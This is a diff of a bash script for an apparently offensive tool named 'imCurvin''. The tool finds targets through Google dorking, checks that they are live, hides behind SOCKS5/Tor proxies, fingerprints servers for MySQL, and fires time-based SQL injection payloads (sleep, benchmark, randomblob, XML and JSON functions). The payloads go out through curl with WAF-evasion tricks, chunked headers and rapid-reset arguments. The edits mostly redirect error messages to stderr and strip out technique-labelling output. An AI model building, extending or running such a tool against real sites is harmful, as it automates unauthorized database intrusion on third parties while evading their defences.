@@ -99,7 +99,7 @@ dork() {
       done < <(echo "$raw" | grep -oP '(?<=url\?q=)[^&]*' | sort -u | head -n 10)
 
       if [ ${#list[@]} -eq 0 ]; then
-        echo -e "[\033[34m${ayamaa}\033[0m] [\033[31m-\033[0m]\e[0m No links found on Google Index."
+        echo -e "[\033[34m${ayamaa}\033[0m] [\033[31m-\033[0m]\e[0m No links found on Google Index." >&2
         exit 1
       fi
 
@@ -122,17 +122,17 @@ dork() {
         test_status=$(curl "$prx" -s -o /dev/null -w "%{http_code}" --max-time 10 "$target_url")
 
         if [ "$test_status" = "000" ]; then
-          echo -e "[\033[31m${ayamaa}\033[0m] [->] Selected URL connection timed out."
+          echo -e "[\033[31m${ayamaa}\033[0m] [->] Selected URL connection timed out." >&2
           exit 1
         elif [ "$test_status" -lt 200 ] || [ "$test_status" -ge 400 ]; then
-          echo -e "[\033[31m${ayamaa}\033[0m] [->] Target returned dead status: HTTP $test_status"
+          echo -e "[\033[31m${ayamaa}\033[0m] [->] Target returned dead status: HTTP $test_status"  >&2
           exit 1
         fi
 
         echo -e "[\033[32m${ayamaa}\033[0m] [+] Target is alive (HTTP $test_status)."
         return 0
       else
-        echo -e "[\033[31m${ayamaa}\033[0m] [x] Google Dorking skipped or invalid selection. Exiting tool."
+        echo -e "[\033[31m${ayamaa}\033[0m] [x] Google Dorking skipped or invalid selection. Exiting tool."  >&2
         exit 1
       fi
     }
@@ -352,32 +352,8 @@ dork() {
             else
               active_payload="$defiance_tamper_path"
             fi
-            local current_method="${REQ_METHOD:-POST}"
-
-            if [[ "$payloadsi" = "true" ]]; then
-              output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Param: $TARGET_PARAM \033[38;5;238m[Len: ${active_payload}]\033[0m"
-            else
-              local technique_name="Generic Time-Based"
-              case "${raw_payload}" in
-                *"benchmark"*)
-                  technique_name="Time-Based (Heavy Benchmark)"
-                ;;
-                *"randomblob"*)
-                  technique_name="Time-Based (CPU-Exhaustion Blob)"
-                ;;
-                *"extractvalue"*|*"updatesxml"*)
-                  technique_name="Time-Based (XML Function Nested)"
-                ;;
-                *"json_keys"*)
-                  technique_name="Time-Based (JSON Object Nested)"
-                ;;
-                *"sleep"*)
-                  technique_name="Time-Based (Sub-Query Sleep)"
-                ;;
-              esac
-              output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
-            fi
-            echo -e "$output_text"
+            local current_method="${REQ_METHOD:-POST}"           
+               
             if [ "$REQ_METHOD" = "POST" ]; then
               curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
                 curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
@@ -442,7 +418,7 @@ dork() {
           local clean_domain=$(echo "$target_url" | awk -F/ '{print $3}' | cut -d':' -f1)
 
           if ! curl $static_proxy -m 3 -s -I "https://torproject.org" > /dev/null; then
-            echo -e "[\033[34m${current_time}\033[0m] \e[0;31m[!]\e[0m SOCKS5 Proxy \033[90moffline.\033[0m Execution aborted."
+            echo -e "[\033[34m${current_time}\033[0m] \e[0;31m[!]\e[0m SOCKS5 Proxy \033[90moffline.\033[0m Execution aborted." >&2
             exit 1
           fi
 
@@ -639,7 +615,7 @@ dork() {
         fi
 
         if [ -z "$target_url" ]; then
-          echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified."
+          echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Error: URL not specified." >&2
           echo -e "\e[0;37m[\e[0mi\e[0;37m]\e[0m Please refer to the option guide below:\n"
           helping
           exit 1
@@ -653,14 +629,14 @@ dork() {
           case "$cmd" in
             nc)
               if ! command -v nc &> /dev/null && ! command -v netcat &> /dev/null; then
-                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'netcat' is not installed on your terminal."
+                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: 'netcat' is not installed on your terminal." >&2
                 echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install netcat-openbsd first before running imCurvin'."
                 exit 1
               fi
             ;;
             *)
               if ! command -v "$cmd" &> /dev/null; then
-                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: '$cmd' is not installed on your terminal."
+                echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: '$cmd' is not installed on your terminal." >&2
                 echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Please install $cmd first before running imCurvin'."
                 exit 1
               fi
@@ -683,11 +659,11 @@ dork() {
             python3 "$DEFIANCE_DIR/../validators/defval.py"
             exit 0
         else
-            echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: Log file is empty. Nothing to validate."
+            echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: Log file is empty. Nothing to validate." >&2
             exit 1
         fi
     else
-        echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: defval.py not found."
+        echo -e "[\033[31m${ayamaa}\033[0m] [->] Error: defval.py not found." >&2
         exit 1
     fi
 fi
@@ -763,12 +739,12 @@ fi
               "PATH_PARAM"|"NO_PARAM")
                 echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
                 echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
-                echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
+                echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n" >&2
                 exit 1
               ;;
               *)
                 if [[ "$target_url" != *"?"* ]]; then
-                  echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
+                  echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]." >&2
                   echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
                   echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
                   exit 1
@@ -791,7 +767,7 @@ fi
           server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
 
           if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
+            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint." >&2
             echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
             echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
             exit 1
